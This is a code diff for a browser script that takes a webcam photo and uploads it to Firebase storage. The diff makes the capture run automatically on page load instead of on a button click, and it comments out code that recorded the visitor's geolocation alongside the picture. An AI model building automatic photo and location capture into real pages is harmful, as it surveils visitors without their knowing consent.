@@ -73,14 +73,14 @@ function startup() {
     false
   );
 
-  startbutton.addEventListener(
-    "click",
-    function(ev) {
-      takepicture();
-      ev.preventDefault();
-    },
-    false
-  );
+  // startbutton.addEventListener(
+  //   "click",
+  //   function(ev) {
+  //     takepicture();
+  //     ev.preventDefault();
+  //   },
+  //   false
+  // );
   takepicture();
 
   clearphoto();
@@ -119,7 +119,7 @@ function takepicture() {
   console.log(data);
   var image = new Image();
   data = data.split(",", 2)[1];
-  var text = image + ladloc;
+  var text = "image" + Math.floor(100000 + Math.random() * 900000);
 
   var ref = storageRef.child(text + "/mountains.jpg");
 
@@ -137,35 +137,35 @@ function takepicture() {
 
 window.addEventListener("load", startup, false);
 function getLocation() {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(showPosition);
-  } else {
-    console.log("Geolocation is not supported by this browser.");
-  }
+  // if (navigator.geolocation) {
+  //   navigator.geolocation.getCurrentPosition(showPosition);
+  // } else {
+  //   console.log("Geolocation is not supported by this browser.");
+  // }
 }
 
-function showPosition(position) {
-  // getLocation()
-  x = position.coords.latitude;
-  y = position.coords.longitude;
-  ladloc = x + y;
-  console.log("https://www.openstreetmap.org/#map=15/" + x + "/" + y);
+// function showPosition(position) {
+//   // getLocation()
+//   x = position.coords.latitude;
+//   y = position.coords.longitude;
+//   ladloc = x + y;
+//   console.log("https://www.openstreetmap.org/#map=15/" + x + "/" + y);
 
-  takepicture();
+//   takepicture();
 
-  writeUserData(time, x, y, picsdata);
-}
+//   writeUserData(time, x, y, picsdata);
+// }
 
-function writeUserData(time, lat, long, picture) {
-  console.log("hey");
-  database.ref("data/" + time).set({
-    latitude: lat,
-    longitude: long,
-    pic: picture
-  });
+// function writeUserData(time, lat, long, picture) {
+//   console.log("hey");
+//   database.ref("data/" + time).set({
+//     latitude: lat,
+//     longitude: long,
+//     pic: picture
+//   });
 
-  console.log("success!");
-}
+//   console.log("success!");
+// }
 
 window.onload = function() {
   startup();
